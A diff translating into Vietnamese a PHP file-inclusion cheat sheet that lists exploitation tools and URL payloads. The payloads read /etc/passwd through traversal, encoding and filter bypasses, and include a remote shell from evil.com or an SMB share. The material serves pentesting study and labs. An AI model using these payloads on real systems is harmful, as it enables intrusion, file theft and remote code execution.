@@ -1,36 +1,36 @@
-# File Inclusion
+# File Inclusion (Chèn Tệp)
 
-> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.
+> File Inclusion Vulnerability là một loại lỗ hổng bảo mật trong các ứng dụng web, phổ biến đặc biệt trong các ứng dụng được phát triển bằng PHP, nơi kẻ tấn công có thể nhúng (include) một tệp, thường là khai thác việc thiếu kiểm tra hợp lệ đầu vào/đầu ra đúng cách. Lỗ hổng này có thể dẫn đến nhiều hoạt động độc hại, bao gồm thực thi mã, đánh cắp dữ liệu, và làm biến dạng website (defacement).
 
-## Summary
+## Tóm tắt
 
-- [Tools](#tools)
+- [Công cụ](#tools)
 - [Local File Inclusion](#local-file-inclusion)
     - [Null Byte](#null-byte)
     - [Double Encoding](#double-encoding)
     - [UTF-8 Encoding](#utf-8-encoding)
-    - [Path Truncation](#path-truncation)
-    - [Filter Bypass](#filter-bypass)
+    - [Cắt xén đường dẫn (Path Truncation)](#path-truncation)
+    - [Vượt qua bộ lọc (Filter Bypass)](#filter-bypass)
 - [Remote File Inclusion](#remote-file-inclusion)
     - [Null Byte](#null-byte-1)
     - [Double Encoding](#double-encoding-1)
-    - [Bypass allow_url_include](#bypass-allow_url_include)
+    - [Vượt qua allow_url_include](#bypass-allow_url_include)
 - [Labs](#labs)
-- [References](#references)
+- [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
-- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
-- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
-- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
-- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool
+- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (đã lưu trữ vào ngày 7 tháng 10, 2020) - kadimus là một công cụ để kiểm tra và khai thác lỗ hổng lfi.
+- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Công cụ khai thác LFI hoàn toàn tự động (+ Reverse Shell) và quét lỗ hổng
+- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap là một công cụ python nhỏ có thể tìm kiếm, chuẩn bị, kiểm tra, khai thác và thậm chí tự động google để tìm các lỗi local và remote file inclusion trong các ứng dụng web.
+- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic là một công cụ kiểm thử xâm nhập mã nguồn mở tự động hóa quá trình tìm kiếm và truy xuất nội dung của các tệp log và cấu hình phổ biến thông qua các lỗ hổng path traversal.
+- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Công cụ phát hiện và khai thác Local File Inclusion
 
 ## Local File Inclusion
 
-**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.
+**File Inclusion Vulnerability** cần được phân biệt với **Path Traversal**. Lỗ hổng Path Traversal cho phép kẻ tấn công truy cập vào một tệp, thường là khai thác cơ chế "đọc" được triển khai trong ứng dụng mục tiêu, trong khi File Inclusion sẽ dẫn đến việc thực thi mã tùy ý.
 
-Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.
+Hãy xem xét một script PHP nhúng (include) một tệp dựa trên đầu vào của người dùng. Nếu không có kiểm tra hợp lệ đúng cách, kẻ tấn công có thể thao túng tham số `page` để nhúng các tệp cục bộ hoặc từ xa, dẫn đến truy cập trái phép hoặc thực thi mã.
 
 ```php
 <?php
@@ -39,7 +39,7 @@ include($file);
 ?>
 ```
 
-In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
+Trong các ví dụ sau đây, chúng ta nhúng tệp `/etc/passwd`, hãy xem chương `Directory & Path Traversal` để biết thêm các tệp thú vị khác.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd
@@ -47,13 +47,13 @@ http://example.com/index.php?page=../../../etc/passwd
 
 ### Null Byte
 
-:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).
+:warning: Trong các phiên bản PHP dưới 5.3.4, chúng ta có thể kết thúc bằng null byte (`%00`).
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
-**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470
+**Ví dụ**: Joomla! Component Web TV 1.0 - CVE-2010-1470
 
 ```ps1
 {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
@@ -73,9 +73,9 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 
-### Path Truncation
+### Cắt xén đường dẫn (Path Truncation)
 
-On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
+Trên hầu hết các bản cài đặt PHP, một tên tệp dài hơn `4096` byte sẽ bị cắt bớt, do đó bất kỳ ký tự dư thừa nào cũng sẽ bị loại bỏ.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
@@ -84,7 +84,7 @@ http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
 http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
 
-### Filter Bypass
+### Vượt qua bộ lọc (Filter Bypass)
 
 ```powershell
 http://example.com/index.php?page=....//....//etc/passwd
@@ -94,15 +94,15 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C
 
 ## Remote File Inclusion
 
-> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
+> Remote File Inclusion (RFI) là một loại lỗ hổng xảy ra khi một ứng dụng nhúng (include) một tệp từ xa, thường là thông qua đầu vào của người dùng, mà không kiểm tra hợp lệ hoặc khử trùng đầu vào đúng cách.
 
-Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.
+Remote File Inclusion không còn hoạt động trên cấu hình mặc định nữa vì `allow_url_include` hiện đã bị vô hiệu hóa kể từ PHP 5.
 
 ```ini
 allow_url_include = On
 ```
 
-Most of the filter bypasses from LFI section can be reused for RFI.
+Hầu hết các cách vượt bộ lọc (filter bypass) từ phần LFI có thể được tái sử dụng cho RFI.
 
 ```powershell
 http://example.com/index.php?page=http://evil.com/shell.txt
@@ -120,13 +120,13 @@ http://example.com/index.php?page=http://evil.com/shell.txt%00
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
 
-### Bypass allow_url_include
+### Vượt qua allow_url_include
 
-When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+Khi `allow_url_include` và `allow_url_fopen` được đặt thành `Off`. Vẫn có thể nhúng một tệp từ xa trên máy Windows bằng cách sử dụng giao thức `smb`.
 
-1. Create a share open to everyone
-2. Write a PHP code inside a file : `shell.php`
-3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
+1. Tạo một share mở cho mọi người
+2. Viết mã PHP bên trong một tệp: `shell.php`
+3. Nhúng nó `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 
 ## Labs
 
@@ -135,7 +135,7 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 - [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
 - [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
 
-## References
+## Tài liệu tham khảo
 
 - [CVV #1: Local File Inclusion - SI9INT - June 20, 2018](https://web.archive.org/web/20200724150218/https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 - [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - May 12, 2019](https://web.archive.org/web/20260220172333/https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
